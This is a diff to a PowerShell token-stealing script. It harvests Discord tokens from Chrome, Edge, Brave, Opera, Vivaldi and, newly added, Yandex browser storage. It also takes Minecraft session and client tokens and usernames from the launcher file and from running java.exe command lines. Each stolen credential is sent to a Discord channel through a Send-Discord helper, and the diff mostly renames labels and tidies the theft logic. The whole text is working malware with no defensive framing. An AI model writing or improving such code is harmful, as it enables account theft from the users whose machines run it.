@@ -30,13 +30,14 @@ foreach ($path in $appPaths) {
     }
 }
 
-# ========== BROWSER DISCORD TOKENS (Chrome, Edge, Brave, Opera, Vivaldi) ==========
+# ========== BROWSER DISCORD TOKENS ==========
 $browserPaths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
     "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
     "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"
+    "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
 )
 
 foreach ($path in $browserPaths) {
@@ -60,10 +61,10 @@ if (Test-Path $mcPath) {
     try {
         $data = Get-Content $mcPath -Raw | ConvertFrom-Json
         if ($data.accessToken) {
-            Send-Discord "**[MINECRAFT SESSION TOKEN]**`n```$($data.accessToken)```"
+            Send-Discord "**[MINECRAFT SESSION]**`n```$($data.accessToken)```"
         }
         if ($data.selectedProfile -and $data.selectedProfile.name) {
-            Send-Discord "**[MINECRAFT USERNAME]**`n$($data.selectedProfile.name)"
+            Send-Discord "**[MINECRAFT USER]**`n$($data.selectedProfile.name)"
         }
         if ($data.clientToken) {
             Send-Discord "**[MINECRAFT CLIENT TOKEN]**`n```$($data.clientToken)```"
@@ -71,21 +72,18 @@ if (Test-Path $mcPath) {
     } catch {}
 }
 
-# ========== JAVA PROCESS TOKENS (Minecraft modded clients) ==========
+# ========== JAVA PROCESS TOKENS ==========
 Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" -ErrorAction SilentlyContinue |
     Select-Object -ExpandProperty CommandLine |
     ForEach-Object {
-        $line = $_
-        if ($line -match '--accessToken\s+(\S+)') {
+        if ($_ -match '--accessToken\s+(\S+)') {
             $accessToken = $matches[1]
             $username = ""
-            if ($line -match '--username\s+(\S+)') {
+            if ($_ -match '--username\s+(\S+)') {
                 $username = $matches[1]
             }
-            if ($accessToken) {
-                Send-Discord "**[JAVA PROCESS TOKEN - $username]**`n```$accessToken```"
-                Start-Sleep -Milliseconds 200
-            }
+            Send-Discord "**[JAVA TOKEN - $username]**`n```$accessToken```"
+            Start-Sleep -Milliseconds 200
         }
     }
 
